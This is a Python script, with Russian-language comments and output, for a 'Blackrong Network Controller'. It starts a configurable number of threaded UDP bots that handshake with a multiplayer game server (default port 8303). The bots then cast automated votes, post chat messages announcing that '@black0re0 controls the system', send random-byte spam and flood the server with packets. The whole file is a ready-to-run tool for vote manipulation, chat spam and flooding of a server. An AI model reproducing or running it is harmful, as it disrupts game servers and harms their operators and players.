#!/usr/bin/env python3
import os
import sys
import json
import socket
import random
import threading
import time
from colorama import Fore, Style, init

init(autoreset=True)

CONFIG_FILE = "blackrong_config.json"
BANNER = f"""
{Fore.CYAN}
╔╗ ╔═╗╔═╗╦═╗╔═╗╔═╗╦═╗╔═╗╔═╗╔═╗
╠╩╗╠═╣║ ╦╠╦╝╠═╣║ ╦╠╦╝╠═╣╠═╝╠═╣
╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝╩╚═╩ ╩╩  ╩ ╩
{Fore.YELLOW}Blackrong Network Controller v6.6
{Fore.MAGENTA}При поддержке @black0re0
{Style.RESET_ALL}
"""

class BlackrongProtocol:
    PACKET_TYPES = {
        'CONNECT': b'\x00',
        'ACCEPT': b'\x01',
        'VOTE': b'\x03',
        'CHAT': b'\x04',
        'KEEPALIVE': b'\x0f'
    }

    @staticmethod
    def create_packet(packet_type, payload=b''):
        header = b'\x00\x00\x00\x00'  # 4-байтовый заголовок
        return header + packet_type + payload

class BlackrongBot:
    def __init__(self, server_ip, server_port, bot_id, mode):
        self.server = (server_ip, server_port)
        self.bot_id = bot_id
        self.mode = mode
        self.running = True
        self.sock = None
        self.token = None
        self.client_id = random.randint(0, 0xFFFFFFFF)
        self.retries = 0
        self.last_action = time.time()
        self.sequence = 0

    def connect(self):
        while self.running and self.retries < 15:
            try:
                self._establish_connection()
                self._main_loop()
                return
            except Exception as e:
                print(f"{Fore.RED}Бот {self.bot_id} ошибка: {str(e)}")
                self.retries += 1
                time.sleep(min(30, 2 ** self.retries))
            finally:
                if self.sock:
                    self.sock.close()

    def _establish_connection(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(10)

        # Шаг 1: Первоначальное рукопожатие
        connect_packet = BlackrongProtocol.create_packet(BlackrongProtocol.PACKET_TYPES['CONNECT'])
        print(f"{Fore.MAGENTA}[Бот {self.bot_id}] Отправка CONNECT: {connect_packet.hex()}")
        self.sock.sendto(connect_packet, self.server)

        try:
            # Шаг 2: Получение ответа сервера
            response = self.sock.recv(1024)
            print(f"{Fore.CYAN}[Бот {self.bot_id}] Получено: {response.hex()} (длина: {len(response)})")
            
            if len(response) < 12:
                raise ConnectionError("Неверный ответ сервера")

            self.token = response[4:8]
            server_time = response[8:12]

            # Шаг 3: Отправка клиентской информации
            ack_packet = BlackrongProtocol.create_packet(
                BlackrongProtocol.PACKET_TYPES['ACCEPT'],
                self.token + server_time + self.client_id.to_bytes(4, 'big')
            )
            print(f"{Fore.MAGENTA}[Бот {self.bot_id}] Отправка ACCEPT: {ack_packet.hex()}")
            self.sock.sendto(ack_packet, self.server)

            # Шаг 4: Финальное подтверждение
            final_response = self.sock.recv(1024)
            print(f"{Fore.CYAN}[Бот {self.bot_id}] Финальный ответ: {final_response.hex()}")
            
            if final_response[0] != int.from_bytes(BlackrongProtocol.PACKET_TYPES['ACCEPT'], "big"):
                raise ConnectionError("Соединение отклонено")

            print(f"{Fore.GREEN}Бот {self.bot_id} успешно подключен!")
            self.retries = 0

        except socket.timeout:
            raise ConnectionError("Таймаут соединения")

    def _main_loop(self):
        while self.running:
            try:
                now = time.time()
                
                # Основные действия
                if now - self.last_action > random.uniform(1.0, 3.0):
                    if self.mode == 'vote':
                        self._send_vote()
                    elif self.mode == 'message':
                        self._send_message()
                    elif self.mode == 'spam':
                        self._send_spam()
                    elif self.mode == 'flood':
                        self._send_flood()
                    
                    self.last_action = now
                    self.sequence += 1

                # Поддержание соединения
                self._handle_keepalive()

            except Exception as e:
                raise RuntimeError(f"Ошибка действия: {str(e)}")

    def _handle_keepalive(self):
        try:
            self.sock.settimeout(5)
            data = self.sock.recv(1024)
            if data:
                if data[0] == int.from_bytes(BlackrongProtocol.PACKET_TYPES['KEEPALIVE'], "big"):
                    print(f"{Fore.BLUE}[Бот {self.bot_id}] Получен keepalive")
                    self.sock.sendto(data, self.server)  # Ответ на keepalive
        except socket.timeout:
            pass

    def _send_vote(self):
        vote_data = self.token + b'\x01\x00\x00\x00'  # Пример голосования
        packet = BlackrongProtocol.create_packet(
            BlackrongProtocol.PACKET_TYPES['VOTE'],
            vote_data
        )
        print(f"{Fore.YELLOW}[Бот {self.bot_id}] Отправка голоса: {packet.hex()}")
        self.sock.sendto(packet, self.server)

    def _send_message(self):
        msg = f"[BOT{self.bot_id}] @black0re0 контролирует систему"
        encoded_msg = msg.encode().ljust(128, b'\x00')
        packet = BlackrongProtocol.create_packet(
            BlackrongProtocol.PACKET_TYPES['CHAT'],
            self.token + encoded_msg
        )
        self.sock.sendto(packet, self.server)
        print(f"{Fore.YELLOW}[Бот {self.bot_id}] Сообщение отправлено")

    def _send_spam(self):
        spam_msg = os.urandom(64)
        packet = BlackrongProtocol.create_packet(
            BlackrongProtocol.PACKET_TYPES['CHAT'],
            self.token + spam_msg
        )
        self.sock.sendto(packet, self.server)
        print(f"{Fore.YELLOW}[Бот {self.bot_id}] Спам пакет отправлен")

    def _send_flood(self):
        for _ in range(5):
            self._send_spam()
            time.sleep(0.1)

    def stop(self):
        self.running = False

def load_config():
    default_config = {
        'server_ip': '127.0.0.1',
        'server_port': 8303,
        'mode': 'message',
        'bot_count': 10,
        'max_retries': 15,
        'cooldown': 1.5
    }
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                return {**default_config, **json.load(f)}
        except:
            print(f"{Fore.RED}Ошибка конфига! Используются настройки по умолчанию")
            return default_config
    return default_config

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4, ensure_ascii=False)

def main():
    print(BANNER)
    config = load_config()
    
    if not os.path.exists(CONFIG_FILE):
        save_config(config)
        print(f"{Fore.YELLOW}Создан новый конфиг: {CONFIG_FILE}")

    bots = []
    try:
        print(f"{Fore.CYAN}Запуск {config['bot_count']} ботов в режиме '{config['mode']}'...")
        for i in range(config['bot_count']):
            bot = BlackrongBot(
                config['server_ip'],
                config['server_port'],
                i+1,
                config['mode']
            )
            thread = threading.Thread(target=bot.connect, daemon=True)
            bots.append((bot, thread))
            thread.start()
            time.sleep(config['cooldown'])

        input("\nНажмите Enter для остановки...")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Прервано!")
    finally:
        print(f"\n{Fore.RED}Остановка ботов...")
        for bot, thread in bots:
            bot.stop()
            thread.join()
        print(f"{Fore.GREEN}Все операции завершены!")

if __name__ == "__main__":
    main()